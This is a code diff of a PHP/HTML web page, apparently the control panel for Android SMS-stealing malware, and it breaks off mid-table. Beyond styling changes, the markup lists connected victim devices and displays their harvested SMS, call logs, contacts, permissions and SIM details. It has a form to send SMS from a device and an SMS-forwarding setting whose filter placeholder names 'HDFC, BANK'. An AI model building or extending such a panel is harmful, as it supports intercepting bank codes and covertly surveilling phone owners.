@@ -17,7 +17,7 @@ header('Content-Type: text/html; charset=UTF-8');
     body::before{content:'';position:fixed;inset:0;background-image:linear-gradient(rgba(255,60,60,0.03) 1px,transparent 1px),linear-gradient(90deg,rgba(255,60,60,0.03) 1px,transparent 1px);background-size:44px 44px;pointer-events:none;z-index:0}
     .wrapper{position:relative;z-index:1}
 
-    /* LOGIN */
+    /* ─── LOGIN ─── */
     #loginPage{position:fixed;inset:0;z-index:9999;background:var(--bg);display:flex;align-items:center;justify-content:center;padding:20px}
     #loginPage.hidden{display:none!important}
     .login-card{background:var(--card);border:1px solid var(--border);border-radius:22px;padding:40px 36px;width:100%;max-width:400px;position:relative;overflow:hidden;box-shadow:0 40px 80px rgba(0,0,0,0.5)}
@@ -39,9 +39,11 @@ header('Content-Type: text/html; charset=UTF-8');
     input:focus,textarea:focus{border-color:var(--accent);box-shadow:0 0 0 3px rgba(255,60,60,0.1)}
     .btn{width:100%;padding:13px;border-radius:10px;border:none;background:linear-gradient(135deg,var(--accent) 0%,#cc0000 100%);color:#fff;font-family:'Syne',sans-serif;font-weight:800;font-size:14px;cursor:pointer;letter-spacing:1px;transition:all 0.2s;text-transform:uppercase}
     .btn:hover{transform:translateY(-2px);box-shadow:0 8px 25px rgba(255,60,60,0.4)}
+    .btn-sm{padding:10px 22px;border-radius:8px;border:none;background:linear-gradient(135deg,var(--accent),#cc0000);color:#fff;font-family:'Syne',sans-serif;font-weight:700;font-size:13px;cursor:pointer;transition:all 0.2s;width:auto}
+    .btn-sm:hover{transform:translateY(-1px);box-shadow:0 6px 18px rgba(255,60,60,0.35)}
 
-    /* HEADER */
-    header{padding:18px 32px;border-bottom:1px solid var(--border);display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:12px;background:rgba(10,10,15,0.92);backdrop-filter:blur(14px);position:sticky;top:0;z-index:100}
+    /* ─── HEADER ─── */
+    header{padding:16px 28px;border-bottom:1px solid var(--border);display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:12px;background:rgba(10,10,15,0.95);backdrop-filter:blur(14px);position:sticky;top:0;z-index:100}
     .logo{display:flex;align-items:center;gap:12px}
     .logo-mark{width:34px;height:34px;filter:drop-shadow(0 0 6px rgba(255,60,60,0.6));animation:logoPulse 2.5s ease-in-out infinite}
     @keyframes logoPulse{0%,100%{filter:drop-shadow(0 0 4px rgba(255,60,60,0.4))}50%{filter:drop-shadow(0 0 14px rgba(255,60,60,0.9))}}
@@ -54,107 +56,146 @@ header('Content-Type: text/html; charset=UTF-8');
     .status-pill.connected .status-dot{background:var(--success);box-shadow:0 0 6px var(--success);animation:blink 1.5s ease-in-out infinite}
     @keyframes blink{0%,100%{opacity:1}50%{opacity:0.3}}
 
-    /* NAV TABS */
-    .nav-tabs{display:flex;gap:2px;padding:0 28px;border-bottom:1px solid var(--border);background:rgba(10,10,15,0.7);backdrop-filter:blur(8px);position:sticky;top:70px;z-index:90;overflow-x:auto}
-    .nav-tab{padding:12px 14px;border:none;background:transparent;font-family:'Space Mono',monospace;font-size:9px;color:var(--muted);cursor:pointer;letter-spacing:1px;text-transform:uppercase;border-bottom:2px solid transparent;transition:all 0.2s;margin-bottom:-1px;display:flex;align-items:center;gap:5px;white-space:nowrap;flex-shrink:0}
-    .nav-tab:hover{color:var(--text)}
-    .nav-tab.active{color:var(--accent);border-bottom-color:var(--accent)}
-    .tab-badge{background:rgba(255,60,60,0.15);border:1px solid rgba(255,60,60,0.3);color:var(--accent);padding:1px 6px;border-radius:8px;font-size:8px}
+    /* ─── LAYOUT ─── */
+    .main-layout{display:flex;min-height:calc(100vh - 65px)}
     .hidden{display:none!important}
 
-    /* DEVICE SELECTOR BAR */
-    .dev-selector{display:flex;align-items:center;gap:8px;padding:8px 28px;background:rgba(255,60,60,0.04);border-bottom:1px solid var(--border);overflow-x:auto}
-    .dev-selector-label{font-family:'Space Mono',monospace;font-size:8px;color:var(--muted);letter-spacing:1.5px;white-space:nowrap}
-    .dev-chip{padding:5px 12px;border-radius:20px;border:1px solid var(--border);background:transparent;color:var(--muted);font-family:'Space Mono',monospace;font-size:9px;cursor:pointer;transition:all 0.2s;white-space:nowrap;display:flex;align-items:center;gap:5px}
-    .dev-chip:hover{border-color:var(--accent);color:var(--text)}
-    .dev-chip.active{border-color:var(--accent);color:var(--accent);background:rgba(255,60,60,0.1)}
-    .dev-chip .dot{width:5px;height:5px;border-radius:50%;background:var(--muted);flex-shrink:0}
-    .dev-chip.is-online .dot{background:var(--success);animation:blink 1.5s infinite}
+    /* ─── SIDEBAR ─── */
+    .sidebar{width:270px;flex-shrink:0;border-right:1px solid var(--border);background:rgba(10,10,15,0.85);height:calc(100vh - 65px);position:sticky;top:65px;overflow-y:auto;display:flex;flex-direction:column}
+    .sidebar::-webkit-scrollbar{width:3px}
+    .sidebar::-webkit-scrollbar-thumb{background:var(--border);border-radius:2px}
+    .sidebar-hdr{padding:14px 16px 10px;border-bottom:1px solid var(--border)}
+    .sidebar-title{font-family:'Space Mono',monospace;font-size:9px;color:var(--muted);letter-spacing:2px;text-transform:uppercase;margin-bottom:10px}
+    .sidebar-stats{display:flex;gap:6px}
+    .mini-stat{flex:1;background:var(--surface);border:1px solid var(--border);border-radius:8px;padding:8px;text-align:center}
+    .mini-val{font-size:20px;font-weight:800;line-height:1}
+    .mini-val.t{color:var(--accent)}
+    .mini-val.on{color:var(--success)}
+    .mini-val.off{color:var(--muted)}
+    .mini-lbl{font-family:'Space Mono',monospace;font-size:7px;color:var(--muted);letter-spacing:1px;margin-top:3px}
+    .sidebar-search{padding:10px 12px;border-bottom:1px solid var(--border)}
+    .sidebar-search input{width:100%;background:var(--surface);border:1px solid var(--border);border-radius:8px;padding:7px 10px;color:var(--text);font-family:'Space Mono',monospace;font-size:10px;outline:none}
+    .sidebar-search input:focus{border-color:var(--accent)}
+    .dev-list{flex:1;padding:8px}
+    .dev-item{padding:12px;border:1px solid var(--border);border-radius:10px;margin-bottom:6px;cursor:pointer;transition:all 0.15s;background:var(--surface);position:relative;overflow:hidden}
+    .dev-item::before{content:'';position:absolute;left:0;top:0;bottom:0;width:3px;background:var(--muted);border-radius:10px 0 0 10px;transition:all 0.2s}
+    .dev-item:hover{border-color:rgba(255,60,60,0.3);background:rgba(255,60,60,0.03)}
+    .dev-item:hover::before{background:var(--accent)}
+    .dev-item.active{border-color:var(--accent);background:rgba(255,60,60,0.06)}
+    .dev-item.active::before{background:var(--accent);box-shadow:0 0 8px rgba(255,60,60,0.5)}
+    .dev-item.is-online::before{background:var(--success)}
+    .dev-item.is-online.active::before{background:var(--success);box-shadow:0 0 8px rgba(0,255,157,0.5)}
+    .dev-top{display:flex;align-items:center;justify-content:space-between;margin-bottom:5px}
+    .dev-name{font-weight:700;font-size:13px}
+    .dev-dot{width:7px;height:7px;border-radius:50%;flex-shrink:0}
+    .dev-dot.online{background:var(--success);box-shadow:0 0 5px var(--success);animation:blink 2s infinite}
+    .dev-dot.offline{background:var(--muted)}
+    .dev-uid{font-family:'Space Mono',monospace;font-size:8px;color:var(--muted);margin-bottom:6px}
+    .dev-chips{display:flex;gap:5px;flex-wrap:wrap}
+    .dchip{font-family:'Space Mono',monospace;font-size:8px;color:var(--muted);background:var(--bg);padding:2px 7px;border-radius:20px;border:1px solid var(--border)}
+    .dchip.bat-hi{color:var(--success);border-color:rgba(0,255,157,0.2)}
+    .dchip.bat-md{color:var(--accent2);border-color:rgba(255,149,0,0.2)}
+    .dchip.bat-lo{color:var(--error);border-color:rgba(255,68,102,0.2)}
+    .dev-empty{text-align:center;padding:30px 14px;color:var(--muted);font-family:'Space Mono',monospace;font-size:9px}
 
-    /* SECTIONS */
-    .section-content{padding:24px 28px 50px;max-width:1400px;margin:0 auto}
-    .dash-header{display:flex;align-items:flex-start;justify-content:space-between;margin-bottom:22px;flex-wrap:wrap;gap:12px}
-    .dash-title{font-size:26px;font-weight:800}
-    .dash-title span{color:var(--accent)}
+    /* ─── MAIN AREA ─── */
+    .main-area{flex:1;overflow-x:hidden}
+    .empty-state{display:flex;flex-direction:column;align-items:center;justify-content:center;height:60vh;gap:14px;opacity:0.35}
+    .empty-icon{font-size:52px}
+    .empty-txt{font-family:'Space Mono',monospace;font-size:11px;color:var(--muted);letter-spacing:2px}
+
+    /* ─── DEVICE DETAIL ─── */
+    .dev-hero{padding:22px 28px;border-bottom:1px solid var(--border);background:linear-gradient(135deg,rgba(255,60,60,0.04) 0%,transparent 60%);position:relative;overflow:hidden}
+    .dev-hero::after{content:'';position:absolute;top:-40%;right:-5%;width:220px;height:220px;border-radius:50%;background:radial-gradient(circle,rgba(255,60,60,0.05),transparent 70%);pointer-events:none}
+    .hero-top{display:flex;align-items:flex-start;justify-content:space-between;flex-wrap:wrap;gap:12px;margin-bottom:16px}
+    .hero-name{font-size:22px;font-weight:800}
+    .hero-brand{font-family:'Space Mono',monospace;font-size:9px;color:var(--muted);letter-spacing:2px;margin-top:3px}
+    .hero-id{font-family:'Space Mono',monospace;font-size:8px;color:var(--accent);margin-top:4px;letter-spacing:1px}
+    .hero-badge{display:inline-flex;align-items:center;gap:6px;padding:5px 14px;border-radius:20px;font-family:'Space Mono',monospace;font-size:9px;font-weight:700;letter-spacing:1px}
+    .hero-badge.online{background:rgba(0,255,157,0.1);border:1px solid rgba(0,255,157,0.25);color:var(--success)}
+    .hero-badge.online::before{content:'';width:6px;height:6px;border-radius:50%;background:var(--success);animation:blink 1.5s infinite}
+    .hero-badge.offline{background:rgba(107,107,136,0.1);border:1px solid rgba(107,107,136,0.2);color:var(--muted)}
+    .hero-badge.offline::before{content:'';width:6px;height:6px;border-radius:50%;background:var(--muted)}
+    .hero-metrics{display:flex;gap:20px;flex-wrap:wrap}
+    .hm{display:flex;flex-direction:column;gap:3px}
+    .hm-lbl{font-family:'Space Mono',monospace;font-size:8px;color:var(--muted);letter-spacing:1.5px}
+    .hm-val{font-size:14px;font-weight:800;color:var(--accent)}
+    .hm-val.green{color:var(--success)}
+    .hm-val.orange{color:var(--accent2)}
+
+    /* ─── DATA TABS ─── */
+    .data-tabs{display:flex;gap:0;padding:0 28px;border-bottom:1px solid var(--border);background:rgba(10,10,15,0.7);overflow-x:auto}
+    .data-tab{padding:11px 14px;border:none;background:transparent;font-family:'Space Mono',monospace;font-size:9px;color:var(--muted);cursor:pointer;letter-spacing:1px;text-transform:uppercase;border-bottom:2px solid transparent;transition:all 0.2s;margin-bottom:-1px;white-space:nowrap;display:flex;align-items:center;gap:5px;flex-shrink:0}
+    .data-tab:hover{color:var(--text)}
+    .data-tab.active{color:var(--accent);border-bottom-color:var(--accent)}
+    .tab-badge{background:rgba(255,60,60,0.15);border:1px solid rgba(255,60,60,0.3);color:var(--accent);padding:1px 6px;border-radius:8px;font-size:8px}
+    .data-section{padding:22px 28px 50px;display:none}
+    .data-section.active{display:block}
+
+    /* ─── TABLES ─── */
     .realtime-badge{display:inline-flex;align-items:center;gap:5px;padding:3px 10px;border-radius:100px;background:rgba(255,149,0,0.1);border:1px solid rgba(255,149,0,0.25);font-family:'Space Mono',monospace;font-size:9px;color:var(--accent2)}
     .rt-dot{width:5px;height:5px;border-radius:50%;background:var(--accent2);animation:blink 1s ease-in-out infinite}
-
-    /* STATS */
-    .dm-stats{display:grid;grid-template-columns:repeat(auto-fit,minmax(140px,1fr));gap:12px;margin-bottom:22px}
-    .stat-card{background:var(--card);border:1px solid var(--border);border-radius:10px;padding:15px 18px;display:flex;flex-direction:column;gap:4px;position:relative;overflow:hidden}
-    .stat-card::before{content:'';position:absolute;top:0;left:0;right:0;height:2px}
-    .stat-card.total::before{background:linear-gradient(90deg,var(--accent),var(--accent2))}
-    .stat-card.online::before{background:var(--success)}
-    .stat-card.offline::before{background:var(--muted)}
-    .stat-label{font-family:'Space Mono',monospace;font-size:8px;color:var(--muted);letter-spacing:1.5px;text-transform:uppercase}
-    .stat-value{font-size:28px;font-weight:800;line-height:1}
-    .stat-card.online .stat-value{color:var(--success)}
-    .stat-card.offline .stat-value{color:var(--muted)}
-
-    /* TOOLBAR */
-    .dm-toolbar{display:flex;gap:10px;margin-bottom:16px;flex-wrap:wrap;align-items:center}
-    .dm-search{width:100%;max-width:300px;background:var(--surface);border:1px solid var(--border);border-radius:8px;padding:9px 14px;color:var(--text);font-family:'Space Mono',monospace;font-size:11px;outline:none}
+    .sec-title{font-size:22px;font-weight:800;margin-bottom:4px}
+    .sec-title span{color:var(--accent)}
+    .dm-toolbar{display:flex;gap:10px;margin-bottom:14px;flex-wrap:wrap;align-items:center}
+    .dm-search{background:var(--surface);border:1px solid var(--border);border-radius:8px;padding:8px 14px;color:var(--text);font-family:'Space Mono',monospace;font-size:11px;outline:none;width:100%;max-width:280px}
     .dm-search:focus{border-color:var(--accent)}
-    .dm-filter-group{display:flex;gap:6px}
-    .filter-btn{padding:7px 12px;border-radius:6px;border:1px solid var(--border);background:transparent;color:var(--muted);font-family:'Space Mono',monospace;font-size:9px;cursor:pointer;transition:all 0.2s;text-transform:uppercase}
-    .filter-btn.active{background:rgba(255,60,60,0.1);border-color:var(--accent);color:var(--accent)}
+    .tbl-wrap{border:1px solid var(--border);border-radius:12px;overflow:hidden;overflow-x:auto}
+    .tbl{width:100%;border-collapse:collapse;min-width:450px}
+    .tbl thead tr{background:rgba(255,60,60,0.05)}
+    .tbl th{padding:10px 14px;font-family:'Space Mono',monospace;font-size:8px;color:var(--muted);letter-spacing:1.5px;text-align:left;white-space:nowrap;text-transform:uppercase;border-bottom:1px solid var(--border)}
+    .tbl tbody tr{border-bottom:1px solid rgba(42,42,58,0.4);transition:background 0.1s}
+    .tbl tbody tr:last-child{border-bottom:none}
+    .tbl tbody tr:hover{background:rgba(255,255,255,0.015)}
+    .tbl td{padding:10px 14px;font-size:12px;vertical-align:middle}
+    .mono{font-family:'Space Mono',monospace;font-size:9px}
+    .tbl-empty{text-align:center;padding:36px;color:var(--muted);font-size:12px}
+    .sbadge{display:inline-flex;align-items:center;gap:4px;padding:2px 8px;border-radius:14px;font-family:'Space Mono',monospace;font-size:8px;font-weight:700}
+    .sbadge.inbox,.sbadge.incoming{background:rgba(0,255,157,0.1);color:var(--success);border:1px solid rgba(0,255,157,0.2)}
+    .sbadge.sent,.sbadge.outgoing{background:rgba(255,149,0,0.1);color:var(--accent2);border:1px solid rgba(255,149,0,0.2)}
+    .sbadge.missed,.sbadge.offline{background:rgba(255,68,102,0.1);color:var(--error);border:1px solid rgba(255,68,102,0.2)}
+    .sbadge.granted{background:rgba(0,255,157,0.1);color:var(--success);border:1px solid rgba(0,255,157,0.2)}
+    .sbadge.denied{background:rgba(255,68,102,0.1);color:var(--error);border:1px solid rgba(255,68,102,0.2)}
 
-    /* DEVICE TABLE */
-    .device-table-wrap{border:1px solid var(--border);border-radius:12px;overflow:hidden;overflow-x:auto}
-    .device-table{width:100%;border-collapse:collapse;min-width:600px}
-    .device-table thead tr{background:rgba(255,60,60,0.05)}
-    .device-table th{padding:11px 14px;font-family:'Space Mono',monospace;font-size:8px;color:var(--muted);letter-spacing:1.5px;text-align:left;white-space:nowrap;text-transform:uppercase;border-bottom:1px solid var(--border)}
-    .device-row{border-bottom:1px solid rgba(42,42,58,0.4);transition:background 0.1s;cursor:pointer}
-    .device-row:hover{background:rgba(255,255,255,0.02)}
-    .device-row.selected-row{background:rgba(255,60,60,0.06)!important;border-left:3px solid var(--accent)}
-    .device-row td{padding:10px 14px;vertical-align:middle;font-size:12px}
-    .device-name-cell{display:flex;align-items:center;gap:10px}
-    .device-icon{width:30px;height:30px;border-radius:6px;background:var(--surface);border:1px solid var(--border);display:flex;align-items:center;justify-content:center;font-size:14px;flex-shrink:0}
-    .device-name{font-weight:600;font-size:13px}
-    .device-id{font-family:'Space Mono',monospace;font-size:8px;color:var(--muted);margin-top:1px}
-    .status-badge{display:inline-flex;align-items:center;gap:4px;padding:3px 8px;border-radius:16px;font-family:'Space Mono',monospace;font-size:9px;font-weight:700}
-    .status-badge::before{content:'';width:5px;height:5px;border-radius:50%;display:block}
-    .status-badge.online{background:rgba(0,255,157,0.1);color:var(--success);border:1px solid rgba(0,255,157,0.2)}
-    .status-badge.online::before{background:var(--success);animation:blink 1.5s infinite}
-    .status-badge.offline{background:rgba(107,107,136,0.1);color:var(--muted);border:1px solid rgba(107,107,136,0.15)}
-    .status-badge.offline::before{background:var(--muted)}
-    .status-badge.warning{background:rgba(255,149,0,0.1);color:var(--accent2);border:1px solid rgba(255,149,0,0.2)}
-    .battery-bar-wrap{display:flex;align-items:center;gap:6px}
-    .battery-bar{width:50px;height:5px;background:var(--border);border-radius:3px;overflow:hidden}
-    .battery-fill{height:100%;border-radius:3px;transition:width 0.3s}
-    .battery-fill.high{background:var(--success)}
-    .battery-fill.medium{background:var(--accent2)}
-    .battery-fill.low{background:var(--error)}
-    .last-seen{font-family:'Space Mono',monospace;font-size:9px;color:var(--muted)}
-    .dm-empty{text-align:center;padding:50px 20px;color:var(--muted);font-size:13px}
-    .dm-empty .empty-icon{font-size:40px;display:block;margin-bottom:10px;opacity:0.4}
+    /* ─── SIM CARDS ─── */
+    .sim-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(260px,1fr));gap:12px;margin-top:12px}
+    .sim-card{background:var(--card);border:1px solid var(--border);border-radius:12px;padding:16px;position:relative;overflow:hidden}
+    .sim-card::before{content:'';position:absolute;top:0;left:0;right:0;height:2px;background:linear-gradient(90deg,var(--accent),var(--accent2))}
+    .sim-row{display:flex;justify-content:space-between;align-items:flex-start;padding:7px 0;border-bottom:1px solid rgba(42,42,58,0.4);gap:8px}
+    .sim-row:last-child{border-bottom:none}
+    .sim-key{font-family:'Space Mono',monospace;font-size:9px;color:var(--accent2);min-width:100px}
+    .sim-val{font-family:'Space Mono',monospace;font-size:10px;color:var(--text);text-align:right;word-break:break-all;max-width:55%}
 
-    /* FORMS */
-    .config-card{background:var(--card);border:1px solid var(--border);border-radius:14px;padding:28px;position:relative;overflow:hidden;max-width:550px;margin:16px 0}
-    .config-card::after{content:'';position:absolute;top:0;left:0;width:2px;height:100%;background:linear-gradient(180deg,var(--accent),var(--accent2));border-radius:14px 0 0 14px}
+    /* ─── PERMS GRID ─── */
+    .perm-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(200px,1fr));gap:8px;margin-top:12px}
+    .perm-item{background:var(--card);border:1px solid var(--border);border-radius:8px;padding:11px 14px;display:flex;align-items:center;justify-content:space-between;gap:8px}
+    .perm-name{font-family:'Space Mono',monospace;font-size:9px;color:var(--text);letter-spacing:0.5px;text-transform:uppercase}
+
+    /* ─── FORM ─── */
+    .config-card{background:var(--card);border:1px solid var(--border);border-radius:14px;padding:24px;position:relative;overflow:hidden;max-width:520px;margin:14px 0}
+    .config-card::after{content:'';position:absolute;top:0;left:0;width:3px;height:100%;background:linear-gradient(180deg,var(--accent),var(--accent2));border-radius:14px 0 0 14px}
     .input-group{display:flex;flex-direction:column;gap:12px;margin-bottom:16px}
     textarea{resize:vertical;min-height:80px}
-    .data-card{background:var(--card);border:1px solid var(--border);border-radius:10px;padding:16px}
-    .field-row{display:flex;justify-content:space-between;align-items:flex-start;gap:6px;padding:7px 0;border-bottom:1px solid rgba(42,42,58,0.4)}
-    .field-row:last-child{border-bottom:none}
-    .field-key{font-family:'Space Mono',monospace;font-size:10px;color:var(--accent2);min-width:120px}
-    .field-val{font-size:12px;color:var(--text);text-align:right;word-break:break-all}
 
-    /* TOAST */
+    /* ─── TOAST ─── */
     .toast-container{position:fixed;bottom:20px;right:20px;z-index:9999;display:flex;flex-direction:column;gap:8px}
-    .toast{background:var(--card);border:1px solid var(--border);border-radius:8px;padding:12px 16px;font-family:'Space Mono',monospace;font-size:11px;color:var(--text);display:flex;align-items:center;gap:10px;min-width:240px;animation:toastIn 0.25s ease;box-shadow:0 6px 24px rgba(0,0,0,0.4)}
+    .toast{background:var(--card);border:1px solid var(--border);border-radius:8px;padding:12px 16px;font-family:'Space Mono',monospace;font-size:11px;color:var(--text);display:flex;align-items:center;gap:10px;min-width:220px;animation:toastIn 0.25s ease;box-shadow:0 6px 24px rgba(0,0,0,0.4)}
     .toast.success{border-color:rgba(0,255,157,0.3)}
     .toast.error{border-color:rgba(255,68,102,0.3)}
     @keyframes toastIn{from{opacity:0;transform:translateX(20px)}to{opacity:1;transform:translateX(0)}}
-    .toast.out{animation:toastOut 0.25s ease forwards}
+    .toast.out{animation:toastOut 0.2s ease forwards}
     @keyframes toastOut{to{opacity:0;transform:translateX(20px)}}
 
-    /* FOOTER */
-    footer{border-top:1px solid var(--border);padding:16px 28px;display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:8px}
+    /* ─── FOOTER ─── */
+    footer{border-top:1px solid var(--border);padding:14px 28px;display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:8px}
     .footer-brand{font-family:'Space Mono',monospace;font-size:10px;color:var(--muted)}
     .footer-brand strong{color:var(--accent)}
 
-    @media(max-width:768px){header{padding:14px 16px}.nav-tabs{padding:0 10px}.nav-tab{padding:10px 8px;font-size:8px}.section-content{padding:16px 10px 36px}.dash-title{font-size:20px}.dm-stats{grid-template-columns:repeat(2,1fr)}}
+    @media(max-width:900px){
+      .sidebar{width:100%;height:auto;position:relative;top:0;border-right:none;border-bottom:1px solid var(--border)}
+      .main-layout{flex-direction:column}
+      .dev-hero,.data-section{padding:16px}
+    }
   </style>
 </head>
 <body>
@@ -180,6 +221,7 @@ header('Content-Type: text/html; charset=UTF-8');
 </div>
 
 <div class="wrapper">
+<!-- HEADER -->
 <header>
   <div class="logo">
     <svg class="logo-mark" viewBox="0 0 38 38" fill="none"><polygon points="19,2 36,10 36,28 19,36 2,28 2,10" fill="rgba(255,60,60,0.12)" stroke="#ff3c3c" stroke-width="1.5"/><text x="19" y="25" text-anchor="middle" font-family="'Syne',sans-serif" font-weight="800" font-size="16" fill="#ff3c3c">R</text></svg>
@@ -188,162 +230,165 @@ header('Content-Type: text/html; charset=UTF-8');
   <div id="statusPill" class="status-pill"><div class="status-dot"></div><span id="statusText">Connecting...</span></div>
 </header>
 
-<!-- DEVICE CHIP BAR -->
-<div id="devSelectorBar" class="dev-selector hidden">
-  <span class="dev-selector-label">DEVICE:</span>
-  <div id="devChips"></div>
-</div>
+<!-- MAIN LAYOUT -->
+<div class="main-layout" id="mainLayout" style="display:none">
 
-<!-- NAV TABS -->
-<div id="navTabs" class="nav-tabs hidden">
-  <button class="nav-tab active" onclick="switchTab('devices')">◉ Devices <span class="tab-badge" id="dtCount">0</span></button>
-  <button class="nav-tab" onclick="switchTab('sms')">💬 SMS <span class="tab-badge" id="smsCount">0</span></button>
-  <button class="nav-tab" onclick="switchTab('calls')">📞 Calls <span class="tab-badge" id="callsCount">0</span></button>
-  <button class="nav-tab" onclick="switchTab('contacts')">👥 Contacts <span class="tab-badge" id="contactsCount">0</span></button>
-  <button class="nav-tab" onclick="switchTab('permissions')">🔐 Perms</button>
-  <button class="nav-tab" onclick="switchTab('siminfo')">📶 SIM</button>
-  <button class="nav-tab" onclick="switchTab('sendsms')">📤 Send SMS</button>
-  <button class="nav-tab" onclick="switchTab('forwarding')">↗️ Forwarding</button>
-</div>
-
-<!-- DEVICES TAB -->
-<div id="devicesSection" class="section-content hidden">
-  <div class="dash-header">
-    <div><div class="dash-title">Connected <span>Devices</span></div><div style="margin-top:4px"><div class="realtime-badge"><div class="rt-dot"></div> LIVE</div></div></div>
-  </div>
-  <div class="dm-stats">
-    <div class="stat-card total"><div class="stat-label">Total</div><div class="stat-value" id="stTotal">0</div></div>
-    <div class="stat-card online"><div class="stat-label">Online</div><div class="stat-value" id="stOnline">0</div></div>
-    <div class="stat-card offline"><div class="stat-label">Offline</div><div class="stat-value" id="stOffline">0</div></div>
-  </div>
-  <div class="dm-toolbar">
-    <input class="dm-search" type="text" id="devSearch" placeholder="Search devices..." oninput="renderDevices()"/>
-    <div class="dm-filter-group">
-      <button class="filter-btn active" onclick="setDevFilter('all',this)">All</button>
-      <button class="filter-btn" onclick="setDevFilter('online',this)">Online</button>
-      <button class="filter-btn" onclick="setDevFilter('offline',this)">Offline</button>
-    </div>
-  </div>
-  <div class="device-table-wrap">
-    <table class="device-table">
-      <thead><tr><th>Device</th><th>Status</th><th>Battery</th><th>Network</th><th>SMS</th><th>Last Seen</th></tr></thead>
-      <tbody id="devTableBody"></tbody>
-    </table>
-  </div>
-  <div id="devEmpty" class="dm-empty hidden"><span class="empty-icon">📡</span>No devices connected yet.</div>
-</div>
-
-<!-- SMS TAB -->
-<div id="smsSection" class="section-content hidden">
-  <div class="dash-header"><div><div class="dash-title">SMS <span>Messages</span></div></div></div>
-  <div class="dm-toolbar"><input class="dm-search" type="text" id="smsSearch" placeholder="Search by number or message..." oninput="filterRows('smsTableBody',this.value)"/></div>
-  <div class="device-table-wrap">
-    <table class="device-table">
-      <thead><tr><th>#</th><th>Number</th><th>Message</th><th>Date</th><th>Type</th></tr></thead>
-      <tbody id="smsTableBody"></tbody>
-    </table>
-  </div>
-  <div id="smsEmpty" class="dm-empty"><span class="empty-icon">📭</span>No SMS data. Grant READ_SMS permission on device.</div>
-</div>
-
-<!-- CALLS TAB -->
-<div id="callsSection" class="section-content hidden">
-  <div class="dash-header"><div><div class="dash-title">Call <span>History</span></div></div></div>
-  <div class="dm-toolbar"><input class="dm-search" type="text" id="callsSearch" placeholder="Search calls..." oninput="filterRows('callsTableBody',this.value)"/></div>
-  <div class="device-table-wrap">
-    <table class="device-table">
-      <thead><tr><th>#</th><th>Number</th><th>Contact</th><th>Date</th><th>Duration</th><th>Type</th></tr></thead>
-      <tbody id="callsTableBody"></tbody>
-    </table>
-  </div>
-</div>
-
-<!-- CONTACTS TAB -->
-<div id="contactsSection" class="section-content hidden">
-  <div class="dash-header"><div><div class="dash-title">Contacts <span>List</span></div></div></div>
-  <div class="dm-toolbar"><input class="dm-search" type="text" id="contactsSearch" placeholder="Search contacts..." oninput="filterRows('contactsTableBody',this.value)"/></div>
-  <div class="device-table-wrap">
-    <table class="device-table">
-      <thead><tr><th>#</th><th>Name</th><th>Phone</th></tr></thead>
-      <tbody id="contactsTableBody"></tbody>
-    </table>
-  </div>
-</div>
-
-<!-- PERMISSIONS TAB -->
-<div id="permissionsSection" class="section-content hidden">
-  <div class="dash-header"><div><div class="dash-title">App <span>Permissions</span></div></div></div>
-  <div class="device-table-wrap">
-    <table class="device-table">
-      <thead><tr><th>Permission</th><th>Status</th></tr></thead>
-      <tbody id="permsTableBody"></tbody>
-    </table>
-  </div>
-</div>
-
-<!-- SIM TAB -->
-<div id="siminfoSection" class="section-content hidden">
-  <div class="dash-header"><div><div class="dash-title">SIM <span>Information</span></div></div></div>
-  <div id="simCards" style="display:grid;grid-template-columns:repeat(auto-fill,minmax(300px,1fr));gap:14px;"></div>
-</div>
-
-<!-- SEND SMS TAB -->
-<div id="sendsmsSection" class="section-content hidden" style="max-width:620px;">
-  <div class="dash-header"><div><div class="dash-title">Send <span>SMS</span></div></div></div>
-  <div class="config-card">
-    <div class="input-group">
-      <div><label>📞 To Number</label><input type="tel" id="sendTo" placeholder="+919876543210"/></div>
-      <div><label>💬 Message</label><textarea id="sendMsg" placeholder="Type message here..."></textarea></div>
-    </div>
-    <button class="btn" onclick="sendSms()">📤 Send SMS to Device</button>
-    <div id="sendStatus" style="margin-top:10px;text-align:center;font-family:'Space Mono',monospace;font-size:11px;"></div>
-  </div>
-  <div class="dash-header" style="margin-top:24px;"><div class="dash-title">Sent <span>History</span></div></div>
-  <div class="device-table-wrap">
-    <table class="device-table">
-      <thead><tr><th>To</th><th>Message</th><th>Status</th><th>Time</th></tr></thead>
-      <tbody id="sentTableBody"></tbody>
-    </table>
-  </div>
-</div>
-
-<!-- FORWARDING TAB -->
-<div id="forwardingSection" class="section-content hidden" style="max-width:620px;">
-  <div class="dash-header"><div><div class="dash-title">SMS <span>Forwarding</span></div></div></div>
-  <div class="config-card">
-    <div style="display:flex;align-items:center;gap:12px;margin-bottom:18px;">
-      <label style="margin:0;font-size:11px;">Enable Forwarding</label>
-      <input type="checkbox" id="fwToggle" onchange="toggleFw()" style="width:18px;height:18px;accent-color:var(--accent);"/>
-    </div>
-    <div class="input-group">
-      <div><label>📞 Forward To Number</label><input type="tel" id="fwNumber" placeholder="+919876543210"/></div>
-      <div style="display:flex;align-items:center;gap:12px;">
-        <label style="margin:0;font-size:11px;">Forward All SMS</label>
-        <input type="checkbox" id="fwAll" checked onchange="document.getElementById('fwDiv').style.display=this.checked?'none':'block'" style="width:18px;height:18px;accent-color:var(--accent);"/>
+  <!-- SIDEBAR -->
+  <div class="sidebar">
+    <div class="sidebar-hdr">
+      <div class="sidebar-title">Connected Devices</div>
+      <div class="sidebar-stats">
+        <div class="mini-stat"><div class="mini-val t" id="stTotal">0</div><div class="mini-lbl">TOTAL</div></div>
+        <div class="mini-stat"><div class="mini-val on" id="stOnline">0</div><div class="mini-lbl">ONLINE</div></div>
+        <div class="mini-stat"><div class="mini-val off" id="stOffline">0</div><div class="mini-lbl">OFFLINE</div></div>
       </div>
-      <div id="fwDiv" style="display:none;"><label>Filter Numbers (comma separated)</label><input type="text" id="fwFilters" placeholder="+9198..., HDFC, BANK"/></div>
     </div>
-    <button class="btn" onclick="saveFw()">💾 Save Settings</button>
+    <div class="sidebar-search">
+      <input placeholder="Search devices..." id="devSearch" oninput="renderSidebar()" autocomplete="off"/>
+    </div>
+    <div class="dev-list" id="devList">
+      <div class="dev-empty">📡 No devices connected</div>
+    </div>
   </div>
-  <div class="dash-header" style="margin-top:24px;"><div class="dash-title">Forwarding <span>History</span></div></div>
-  <div class="device-table-wrap">
-    <table class="device-table">
